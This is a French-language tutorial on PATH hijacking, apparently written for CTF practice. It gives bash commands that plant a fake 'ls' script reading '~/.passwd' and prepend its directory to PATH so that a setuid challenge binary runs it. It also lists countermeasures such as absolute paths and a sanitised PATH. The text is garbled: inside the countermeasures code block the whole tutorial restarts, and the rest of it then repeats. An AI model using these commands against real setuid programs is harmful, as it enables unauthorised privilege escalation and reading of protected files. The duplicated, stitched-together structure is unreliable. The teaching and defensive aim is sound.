# Path Hijacking

## 1. Introduction

Le **Path Hijacking** est une technique d'attaque où un utilisateur
malveillant manipule la variable d'environnement `PATH` pour forcer un
programme à exécuter **son propre binaire** au lieu d'un binaire
légitime.

C'est très courant dans les **exercices de CTF**, les **challenges de
sécurité** et parfois dans le **pentest**.

------------------------------------------------------------------------

## 2. La variable PATH

La variable `PATH` contient une liste de répertoires que le shell
parcourt pour trouver les commandes à exécuter.

Exemple :

``` bash
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Quand tu tapes `ls`, le shell va chercher dans l'ordre :

1.  `/usr/local/sbin/ls`
2.  `/usr/local/bin/ls`
3.  `/usr/sbin/ls`
4.  `/usr/bin/ls`
5.  `/sbin/ls`
6.  `/bin/ls`

La **première correspondance** sera exécutée.

------------------------------------------------------------------------

## 3. Principe du Path Hijacking

Si tu as un **script ou un binaire vulnérable** qui exécute des
commandes sans chemin absolu, tu peux :

1.  Créer un **faux binaire** avec le même nom qu'une commande attendue
    (`ls`, `cat`, etc.)
2.  Placer ce binaire dans un **répertoire que tu contrôles**
3.  Mettre ce répertoire **en tête du PATH**

Exemple :

``` bash
mkdir /tmp/malware
echo -e '#!/bin/bash
/bin/cat ~/.passwd' > /tmp/malware/ls
chmod +x /tmp/malware/ls

export PATH=/tmp/malware:$PATH
```

Maintenant, si un programme appelle `ls` sans chemin complet, il
exécutera ton script au lieu de `/bin/ls`.

------------------------------------------------------------------------

## 4. Exemple concret

### Situation

-   Utilisateur : `app-script-ch12`
-   Binaire : `/challenge/app-script/ch12/ch12` (setuid)
-   Le binaire appelle `ls` dans son code **sans chemin absolu**

### Exploit

``` bash
# Crée ton faux "ls"
echo -e '#!/bin/bash
/bin/cat ~/.passwd' > /dev/shm/ls
chmod +x /dev/shm/ls

# Ajoute /dev/shm au début du PATH
export PATH=/dev/shm:$PATH

# Lance le binaire vulnérable
/challenge/app-script/ch12/ch12
```

Résultat : le binaire exécute **ton script** et te donne accès à des
informations normalement interdites.

------------------------------------------------------------------------

## 5. Différence entre Path Hijacking et Path Injection

-   **Path Hijacking** : tu remplaces un binaire légitime par le tien
    dans le PATH.
-   **Path Injection** : tu ajoutes un répertoire malveillant au PATH,
    l'effet est similaire, mais le terme est plus général.

------------------------------------------------------------------------

## 6. Contre-mesures

Pour éviter ce type d'attaque :

1.  **Ne jamais exécuter de commandes sans chemin absolu** dans des
    programmes setuid.

    ``` c# Path Hijacking

## 1. Introduction

Le **Path Hijacking** est une technique d'attaque où un utilisateur
malveillant manipule la variable d'environnement `PATH` pour forcer un
programme à exécuter **son propre binaire** au lieu d'un binaire
légitime.

C'est très courant dans les **exercices de CTF**, les **challenges de
sécurité** et parfois dans le **pentest**.

------------------------------------------------------------------------

## 2. La variable PATH

La variable `PATH` contient une liste de répertoires que le shell
parcourt pour trouver les commandes à exécuter.

Exemple :

``` bash
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Quand tu tapes `ls`, le shell va chercher dans l'ordre :

1.  `/usr/local/sbin/ls`
2.  `/usr/local/bin/ls`
3.  `/usr/sbin/ls`
4.  `/usr/bin/ls`
5.  `/sbin/ls`
6.  `/bin/ls`

La **première correspondance** sera exécutée.

------------------------------------------------------------------------

## 3. Principe du Path Hijacking

Si tu as un **script ou un binaire vulnérable** qui exécute des
commandes sans chemin absolu, tu peux :

1.  Créer un **faux binaire** avec le même nom qu'une commande attendue
    (`ls`, `cat`, etc.)
2.  Placer ce binaire dans un **répertoire que tu contrôles**
3.  Mettre ce répertoire **en tête du PATH**

Exemple :

``` bash
mkdir /tmp/malware
echo -e '#!/bin/bash
/bin/cat ~/.passwd' > /tmp/malware/ls
chmod +x /tmp/malware/ls

export PATH=/tmp/malware:$PATH
```

Maintenant, si un programme appelle `ls` sans chemin complet, il
exécutera ton script au lieu de `/bin/ls`.

------------------------------------------------------------------------

## 4. Exemple concret

### Situation

-   Utilisateur : `app-script-ch12`
-   Binaire : `/challenge/app-script/ch12/ch12` (setuid)
-   Le binaire appelle `ls` dans son code **sans chemin absolu**

### Exploit

``` bash
# Crée ton faux "ls"
echo -e '#!/bin/bash
/bin/cat ~/.passwd' > /dev/shm/ls
chmod +x /dev/shm/ls

# Ajoute /dev/shm au début du PATH
export PATH=/dev/shm:$PATH

# Lance le binaire vulnérable
/challenge/app-script/ch12/ch12
```

Résultat : le binaire exécute **ton script** et te donne accès à des
informations normalement interdites.

------------------------------------------------------------------------

## 5. Différence entre Path Hijacking et Path Injection

-   **Path Hijacking** : tu remplaces un binaire légitime par le tien
    dans le PATH.
-   **Path Injection** : tu ajoutes un répertoire malveillant au PATH,
    l'effet est similaire, mais le terme est plus général.

------------------------------------------------------------------------

## 6. Contre-mesures

Pour éviter ce type d'attaque :

1.  **Ne jamais exécuter de commandes sans chemin absolu** dans des
    programmes setuid.

    ``` c
    system("/bin/ls"); // Correct
    system("ls");      // Vulnérable
    ```

2.  **Ne pas exécuter de scripts shell avec des droits élevés** si la
    variable PATH peut être modifiée.

3.  **Restreindre les permissions des répertoires dans le PATH.**

4.  **Sanitiser la variable PATH** dans les scripts sensibles :

    ``` bash
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    ```

------------------------------------------------------------------------

## 7. Résumé

-   Le Path Hijacking exploite la priorité de recherche dans `$PATH`.
-   Très utilisé pour **exploiter des binaires setuid ou vulnérables**.
-   Toujours préférer les **chemins absolus** et **nettoyer le PATH**
    pour les programmes sensibles.

------------------------------------------------------------------------

### 📚 Références

-   OWASP: Path Injection\
-   Linux Privilege Escalation - PATH Hijacking\
-   GTFOBins - PATH Hijacking Examples
    system("/bin/ls"); // Correct
    system("ls");      // Vulnérable
    ```

2.  **Ne pas exécuter de scripts shell avec des droits élevés** si la
    variable PATH peut être modifiée.

3.  **Restreindre les permissions des répertoires dans le PATH.**

4.  **Sanitiser la variable PATH** dans les scripts sensibles :

    ``` bash
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    ```

------------------------------------------------------------------------

## 7. Résumé

-   Le Path Hijacking exploite la priorité de recherche dans `$PATH`.
-   Très utilisé pour **exploiter des binaires setuid ou vulnérables**.
-   Toujours préférer les **chemins absolus** et **nettoyer le PATH**
    pour les programmes sensibles.

------------------------------------------------------------------------

### 📚 Références

-   OWASP: Path Injection\
-   Linux Privilege Escalation - PATH Hijacking\
-   GTFOBins - PATH Hijacking Examples
